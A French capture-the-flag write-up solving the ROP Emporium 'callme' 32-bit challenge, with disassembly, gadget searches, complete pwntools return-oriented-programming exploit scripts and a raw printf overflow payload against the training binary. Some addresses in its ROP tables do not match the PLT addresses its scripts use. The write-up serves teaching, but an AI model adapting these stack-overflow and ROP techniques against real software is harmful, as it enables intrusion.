---
Title: Ropemporium x86_32 callme
Date: 2023-06-13
Tags: [linux, python, ROP, x86_32, ropemporium]
Categories: [tutorial]
Author: cdpointpoint
---

# callme x86_32

## Introduction

Cette fois ci on doit appeller trois fonctions succesivement avec des parametres attendus.
En x86 32 bits, les paramètres étant passé sur la pile la construction de la Ropchaine est
différente qu'en 64 bits


## Découverte

### Execution

    ropemporium/x32/callme$ ./callme32
    callme by ROP Emporium
    x86

    Hope you read the instructions...

    > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Thank you!

    Exiting

## Analyse

### La fonction vulnérable

    gef➤  disas pwnme
    Dump of assembler code for function pwnme:
    0x080486ed <+0>:	push   ebp
    0x080486ee <+1>:	mov    ebp,esp
    0x080486f0 <+3>:	sub    esp,0x28
    0x080486f3 <+6>:	sub    esp,0x4
    0x080486f6 <+9>:	push   0x20
    0x080486f8 <+11>:	push   0x0
    0x080486fa <+13>:	lea    eax,[ebp-0x28]
    0x080486fd <+16>:	push   eax
    0x080486fe <+17>:	call   0x8048540 <memset@plt>
    0x08048703 <+22>:	add    esp,0x10
    0x08048706 <+25>:	sub    esp,0xc
    0x08048709 <+28>:	push   0x8048848
    0x0804870e <+33>:	call   0x8048500 <puts@plt>
    0x08048713 <+38>:	add    esp,0x10
    0x08048716 <+41>:	sub    esp,0xc
    0x08048719 <+44>:	push   0x804886b
    0x0804871e <+49>:	call   0x80484d0 <printf@plt>
    0x08048723 <+54>:	add    esp,0x10
    0x08048726 <+57>:	sub    esp,0x4
    0x08048729 <+60>:	push   0x200
    0x0804872e <+65>:	lea    eax,[ebp-0x28]
    0x08048731 <+68>:	push   eax
    0x08048732 <+69>:	push   0x0
    0x08048734 <+71>:	call   0x80484c0 <read@plt>
    0x08048739 <+76>:	add    esp,0x10
    0x0804873c <+79>:	sub    esp,0xc
    0x0804873f <+82>:	push   0x804886e
    0x08048744 <+87>:	call   0x8048500 <puts@plt>
    0x08048749 <+92>:	add    esp,0x10
    0x0804874c <+95>:	nop
    0x0804874d <+96>:	leave
    0x0804874e <+97>:	ret
    End of assembler dump.

L'appel à la fonction read :

    0x08048729 <+60>:	push   0x200
    0x0804872e <+65>:	lea    eax,[ebp-0x28]
    0x08048731 <+68>:	push   eax
    0x08048732 <+69>:	push   0x0
    0x08048734 <+71>:	call   0x80484c0 <read@plt>

Le débordement se fait à partir de 0x28 + 4  = 0x2c (44) octets
Le buffer est d'une taille importante :  0x200 (512) octets.


L'objectif nous est suggéré par la fonction

    gef➤  disas usefulFunction
        Dump of assembler code for function usefulFunction:
        0x0804874f <+0>:	push   ebp
        0x08048750 <+1>:	mov    ebp,esp
        0x08048752 <+3>:	sub    esp,0x8
        0x08048755 <+6>:	sub    esp,0x4
        0x08048758 <+9>:	push   0x6
        0x0804875a <+11>:	push   0x5
        0x0804875c <+13>:	push   0x4
        0x0804875e <+15>:	call   0x80484e0 <callme_three@plt>
        0x08048763 <+20>:	add    esp,0x10
        0x08048766 <+23>:	sub    esp,0x4
        0x08048769 <+26>:	push   0x6
        0x0804876b <+28>:	push   0x5
        0x0804876d <+30>:	push   0x4
        0x0804876f <+32>:	call   0x8048550 <callme_two@plt>
        0x08048774 <+37>:	add    esp,0x10
        0x08048777 <+40>:	sub    esp,0x4
        0x0804877a <+43>:	push   0x6
        0x0804877c <+45>:	push   0x5
        0x0804877e <+47>:	push   0x4
        0x08048780 <+49>:	call   0x80484f0 <callme_one@plt>
        0x08048785 <+54>:	add    esp,0x10
        0x08048788 <+57>:	sub    esp,0xc
        0x0804878b <+60>:	push   0x1
        0x0804878d <+62>:	call   0x8048510 <exit@plt>
    End of assembler dump.

On peut essayer d'appeller cette fonction

    printf "%44s\x4f\x87\x04\x08\x00" A|./callme32
    callme by ROP Emporium
    x86

    Hope you read the instructions...

    > Thank you!
    Incorrect parameters

L'énnoncé nous indique que l'objectif est d'appeller successivement les trois fonctions avec des paramètres attendus.

"You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag."

## Construction de la chaine de ROP

### Introduction

Pour réaliser l'appel d'une fonction x86 32 bits le passage des paramètres se fait simplement sur la pile

Les trois arguments sont donc attendus sur la pile par chaque appel de fonction.

Ce qui permet d'envisager d'appeller

| ROP entry | comment |
| ----------- | ------- |
| 0x80484f0  | callme_one@plt |
| 0xdeadbeef | param1 |
| 0xcafebabe | param2 |
| 0xd00df00d | param3 |
| 0x0804876f | callme_two@plt |
| 0xdeadbeef | param1 |
| 0xcafebabe | param2 |
| 0xd00df00d | param3 |
| 0x0804875e | callme_three@plt |
| 0xdeadbeef | param1 |
| 0xcafebabe | param2 |
| 0xd00df00d | param3 |

Il y a cependant quelques petites nuances.

- lorsqu'on execute ue fonction en sautant directement à son adresse, l'adresse de retour n'est pas empilée comme c'est le cas
avec un call.
- la fonction va utiliser les trois paramètres mais quid de l'enchainement sur l'appel de fonction suivant ?

Le paragraphe suivant essaie de décrire la solution en passant par l'experience de l'appriche naive.
Il peut être sauté par le lecteur impatient.

### Première tentative

Observons ce qui se passe avec notre première ropchaine et les script python suivant.

``` python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# break apres le read dans pwnme
gs='''
b *pwnme+97
c
'''

# Set up pwntools for the correct architecture
elf =  ELF('callme32')
context.binary=elf

# Offset avant ecrasement de l'adresse de retour
offset=0x2c

callme_one=elf.plt['callme_one']
callme_two=elf.plt['callme_two']
callme_three=elf.plt['callme_three']

io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

log.info(f"{callme_one=:x}")
log.info(f"{callme_two=:x}")
log.info(f"{callme_three=:x}")

# io.recvuntil(b"> ")

PL =b"A"*offset
PL+=p32(callme_one)
PL+=p32(0xdeadbeef)
PL+=p32(0xcafebabe)
PL+=p32(0xd00df00d)

PL+=p32(callme_two)
PL+=p32(0xdeadbeef)
PL+=p32(0xcafebabe)
PL+=p32(0xd00df00d)

PL+=p32(callme_three)
PL+=p32(0xdeadbeef)
PL+=p32(0xcafebabe)
PL+=p32(0xd00df00d)

# Affichage pour mise au point avec printf.
print(''.join([ f"\\x{c:02x}" for c in PL]))

io.sendline(PL)
io.interactive()
```
Execution :

    python3 essai1.py -d

    [*] '/home/jce/w/ropemporium/x32/callme/callme32'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
        RUNPATH:  b'.'
    [+] Starting local process '/home/jce/w/ropemporium/x32/callme/callme32': pid 6132
    [*] callme_one=80484f0
    [*] callme_two=8048550
    [*] callme_three=80484e0

    printf %44s\xf0\x84\x04\x08\xef\xbe\xad\xde\xbe\xba\xfe\xca\x0d\xf0\x0d\xd0\x50\x85\x04\x08\xef\xbe\xad\xde\xbe\xba\xfe\xca\x0d\xf0\x0d\xd0\xe0\x84\x04\x08\xef\xbe\xad\xde\xbe\xba\xfe\xca\x0d\xf0\x0d\xd0 A

    [*] Switching to interactive mode
    [*] Process '/home/jce/w/ropemporium/x32/callme/callme32' stopped with exit code 1 (pid 6132)
    callme by ROP Emporium
    x86

    Hope you read the instructions...

    > Thank you!
    Incorrect parameters
    [*] Got EOF while reading in interactive

Voilà qui est décevant

Observons ce qui se passe.

Avec un point d'arrêt en pwnme+97 sur le ret
La pile :

    ─────────────────────────────────────────────────────────────── stack ────
    0xffd58b8c│+0x0000: 0x80484f0  →  <callme_one@plt+0> jmp DWORD PTR ds:0x804a018	 ← $esp
    0xffd58b90│+0x0004: 0xdeadbeef
    0xffd58b94│+0x0008: 0xcafebabe
    0xffd58b98│+0x000c: 0xd00df00d
    0xffd58b9c│+0x0010: 0x8048550  →  <callme_two@plt+0> jmp DWORD PTR ds:0x804a030
    0xffd58ba0│+0x0014: 0xdeadbeef
    0xffd58ba4│+0x0018: 0xcafebabe
    0xffd58ba8│+0x001c: 0xd00df00d
    ─────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048749 <pwnme+92>       add    esp, 0x10
    0x804874c <pwnme+95>       nop
    0x804874d <pwnme+96>       leave
    →  0x804874e <pwnme+97>       ret
      ↳ 0x80484f0 <callme_one@plt+0> jmp    DWORD PTR ds:0x804a018
        0x80484f6 <callme_one@plt+6> push   0x18
        0x80484fb <callme_one@plt+11> jmp    0x80484b0
        0x8048500 <puts@plt+0>     jmp    DWORD PTR ds:0x804a01c
        0x8048506 <puts@plt+6>     push   0x20
        0x804850b <puts@plt+11>    jmp    0x80484b0

On avance jusqu'à l'entréee de callme_one :

    ni 17

Il faut 17 instructions pour passer le déroulement de la résolution d'adresse via la PLT car c'est le premier appel de cette fonction.

    ─────────────────────────────────────────────────────────────── stack ────
    0xffa3fb30│+0x0000: 0xdeadbeef	 ← $esp
    0xffa3fb34│+0x0004: 0xcafebabe
    0xffa3fb38│+0x0008: 0xd00df00d
    0xffa3fb3c│+0x000c: 0x8048550  →  <callme_two@plt+0> jmp DWORD PTR ds:0x804a030
    0xffa3fb40│+0x0010: 0xdeadbeef
    0xffa3fb44│+0x0014: 0xcafebabe
    0xffa3fb48│+0x0018: 0xd00df00d
    0xffa3fb4c│+0x001c: 0x80484e0  →  <callme_three@plt+0> jmp DWORD PTR ds:0x804a014
    ─────────────────────────────────────────────────────────── code:x86:32 ────
    → 0xf7fc663d <callme_one+0>   push   ebp
    0xf7fc663e <callme_one+1>   mov    ebp, esp
    0xf7fc6640 <callme_one+3>   push   ebx
    0xf7fc6641 <callme_one+4>   sub    esp, 0x14
    0xf7fc6644 <callme_one+7>   call   0xf7fc6540 <__x86.get_pc_thunk.bx>
    0xf7fc6649 <callme_one+12>  add    ebx, 0x19b7


ESP pointe sur le premier paramètre.

Normalement lors d'un appel de fonction la pile est dans cette situation

exemple sur un appel de callme_on(3,4,5) par usefullFunction:

    0xffffd310│+0x0000: 0x8048763  →  <usefulFunction+20> add esp, 0x10	 ← $esp
    0xffffd314│+0x0004: 0x00000004
    0xffffd318│+0x0008: 0x00000005
    0xffffd31c│+0x000c: 0x00000006

ESP pointe sur l'adresse de retour, ensuite on trouve les 3 arguments.

Lors d'un rop on saute directement sur l'adresse de la fonction sans empiler EIP comme le ferait un call.
On a donc un décalage d'un mot.

Regardons le début du code de la fonction :

    gef➤  x/8i $eip
    => 0xf7fc663e <callme_one+1>:	mov    ebp,esp
    0xf7fc6640 <callme_one+3>:	push   ebx
    0xf7fc6641 <callme_one+4>:	sub    esp,0x14
    0xf7fc6644 <callme_one+7>:	call   0xf7fc6540 <__x86.get_pc_thunk.bx>
    0xf7fc6649 <callme_one+12>:	add    ebx,0x19b7
    0xf7fc664f <callme_one+18>:	cmp    DWORD PTR [ebp+0x8],0xdeadbeef
    0xf7fc6656 <callme_one+25>:	jne    0xf7fc6733 <callme_one+246>
    0xf7fc665c <callme_one+31>:	cmp    DWORD PTR [ebp+0xc],0xcafebabe

La fonction va comparer ebp+8 avec la valeur attendue pour le premier pramètre : 0xdeadbeef

Préalablement `ebp` est affecté à la valeur initial de `esp` pour conserver la localiation de la pile précédente.

Avançons jusqu'à la comparaison.

    0xffa3fb14│+0x0000: 0x41414141	 ← $esp
    0xffa3fb18│+0x0004: 0xf7fe78f0  →   pop edx
    0xffa3fb1c│+0x0008: 0xffffffff
    0xffa3fb20│+0x000c: 0xf7fc663d  →  <callme_one+0> push ebp
    0xffa3fb24│+0x0010: 0x00000b
    0xffa3fb28│+0x0014: 0x00000000
    0xffa3fb2c│+0x0018: 0x41414141	 ← $ebp
    0xffa3fb30│+0x001c: 0xdeadbeef
    ───────────────────────────────────────────────────────────── code:x86:32 ────
    0xf7fc6641 <callme_one+4>   sub    esp, 0x14
    0xf7fc6644 <callme_one+7>   call   0xf7fc6540 <__x86.get_pc_thunk.bx>
    0xf7fc6649 <callme_one+12>  add    ebx, 0x19b7
    → 0xf7fc664f <callme_one+18>  cmp    DWORD PTR [ebp+0x8], 0xdeadbeef
    0xf7fc6656 <callme_one+25>  jne    0xf7fc6733 <callme_one+246>
    0xf7fc665c <callme_one+31>  cmp    DWORD PTR [ebp+0xc], 0xcafebabe
    0xf7fc6663 <callme_one+38>  jne    0xf7fc6733 <callme_one+246>
    0xf7fc6669 <callme_one+44>  cmp    DWORD PTR [ebp+0x10], 0xd00df00d
    0xf7fc6670 <callme_one+51>  jne    0xf7fc6733 <callme_one+246>

On voit que est en ebp+4 et

    x/1x $ebp+8
    0xffa3fb34:	0xcafebabe

La valeur est comparée avec le second paramètre.

Il nous faut donc placer une adresse de retour

Envisagons de mettre callme_two a cette adresse pour continuer le traiement attendu.

| ROP entry | comment |
| ----------- | ------- |
| 0x80484f0  | callme_one@plt |
| 0x0804876f | callme_two@plt |
| 0xdeadbeef | param1 |
| 0xcafebabe | param2 |
| 0xd00df00d | param3 |
???

On va probablement executer correctement callme_one puis sauter sur callme_two mais rencontrer le même problème que précédement.
On ne peut pas rejouter callme_three qui serait pris comme premier paramètre par callme_one

essai :


    callme by ROP Emporium
    x86

    Hope you read the instructions...

    > Thank you!
    callme_one() called correctly
    Incorrect parameters
    [*] Got EOF while reading in interactive

On a bien passé callme_on mais c'est tout.

**La solution** consiste à placer dans l'adresse de retour l'adresse d'un gadget qui effectuer sur la pile l'équivalent de ce que l'appel normal de la fonction ferait : consommer les trois paramètres.

Concrètement cela correspond à incrémenter l'adresse de la pile de 12 octets , effectuer 3 pop, ou encore trouver un "ret 0xc"
- add $esp, 12
- pop reg; pop reg; pop reg; ret
- ret 12

### Recherche de gadget

Recherchons donc un gadget qui incrément esp de 12.

``` sh

    root@zbook310152:/w/ropemporium/x32/callme# ROPgadget --binary callme32 --depth 5|grep "add esp"
    0x080485f2 : add esp, 0x10 ; leave ; ret
    0x080484aa : add esp, 8 ; pop ebx ; ret

    root@zbook310152:/w/ropemporium/x32/callme# ROPgadget --binary callme32 |grep "ret "
    0x0804861e : ret 0xeac1

    ropemporium/x32/callme# ROPgadget --binary callme32 --depth 5|grep "pop"
    0x080484aa : add esp, 8 ; pop ebx ; ret
    0x080484ab : les ecx, ptr [eax] ; pop ebx ; ret
    0x08048681 : mov ebp, esp ; pop ebp ; jmp 0x8048610
    0x08048683 : pop ebp ; jmp 0x8048610
    0x080487fb : pop ebp ; ret
    0x080487f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
    0x080484ad : pop ebx ; ret
    0x080487fa : pop edi ; pop ebp ; ret
    0x080487f9 : pop esi ; pop edi ; pop ebp ; ret
    0x080486ea : popal ; cld ; ret
    0x08048680 : push ebp ; mov ebp, esp ; pop ebp ; jmp 0x8048610
```
On peut retenir le gadget :

    0x080484aa : add esp, 8 ; pop ebx ; ret

ou

    0x080487f9 : pop esi ; pop edi ; pop ebp ; ret

La ropchaine au final devient :

| ROP entry | comment |
| ----------- | ------- |
| 0x80484f0  | callme_one@plt |
| 0x080484aa | pop3ret |
| 0xdeadbeef | param1 |
| 0xcafebabe | param2 |
| 0xd00df00d | param3 |
| 0x0804876f | callme_two@plt |
| 0x080484aa | pop3ret |
| 0xdeadbeef | param1 |
| 0xcafebabe | param2 |
| 0xd00df00d | param3 |
| 0x0804875e | callme_three@plt |
| 0x080484aa | pop3ret |
| 0xdeadbeef | param1 |
| 0xcafebabe | param2 |
| 0xd00df00d | param3 |


### Exploitation
## Script python

``` python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# break apres le read dans pwnme
gs='''
b *pwnme+97
c
'''

# Set up pwntools for the correct architecture
elf =  ELF('callme32')
context.binary=elf

# Offset avant ecrasement de l'adresse de retour
offset=0x2c

callme_one=elf.plt['callme_one']
callme_two=elf.plt['callme_two']
callme_three=elf.plt['callme_three']

# Au choix
# 0x080484aa : add esp, 8 ; pop ebx ; ret
g_pop3ret=0x080484aa
# 0x080487f9 :  pop esi ; pop edi ; pop ebp ; ret
#g_pop3ret=0x080487f9

io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

log.info(f"{callme_one=:x}")
log.info(f"{callme_two=:x}")
log.info(f"{callme_three=:x}")

# io.recvuntil(b"> ")

PL =b"A"*offset
PL+=p32(callme_one)
PL+=p32(g_pop3ret)
PL+=p32(0xdeadbeef)
PL+=p32(0xcafebabe)
PL+=p32(0xd00df00d)

PL+=p32(callme_two)
PL+=p32(g_pop3ret)
PL+=p32(0xdeadbeef)
PL+=p32(0xcafebabe)
PL+=p32(0xd00df00d)

PL+=p32(callme_three)
PL+=p32(g_pop3ret)
PL+=p32(0xdeadbeef)
PL+=p32(0xcafebabe)
PL+=p32(0xd00df00d)

io.sendline(PL)
io.interactive()
```

### Execution

``` sh
ropemporium/x32/callme# python3 solve.py
[*] '/w/ropemporium/x32/callme/callme32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.'
[+] Starting local process '/w/ropemporium/x32/callme/callme32': pid 126
[*] callme_one=80484f0
[*] callme_two=8048550
[*] callme_three=80484e0

[*] Switching to interactive mode
[*] Process '/w/ropemporium/x32/callme/callme32' stopped with exit code 0 (pid 126)
callme by ROP Emporium
x86

Hope you read the instructions...

> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}

```

Ou en shell :

``` sh
opemporium/x32/callme# printf "%44s\xf0\x84\x04\x08\xaa\x84\x04\x08\xef\xbe\xad\xde\xbe\xba\xfe\xca\x0d\xf0\x0d\xd0\x50\x85\x04\x08\xaa\x84\x04\x08\xef\xbe\xad\xde\xbe\xba\xfe\xca\x0d\xf0\x0d\xd0\xe0\x84\x04\x08\xaa\x84\x04\x08\xef\xbe\xad\xde\xbe\xba\xfe\xca\x0d\xf0\x0d\xd0" A|./callme32
callme by ROP Emporium
x86

Hope you read the instructions...

> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}


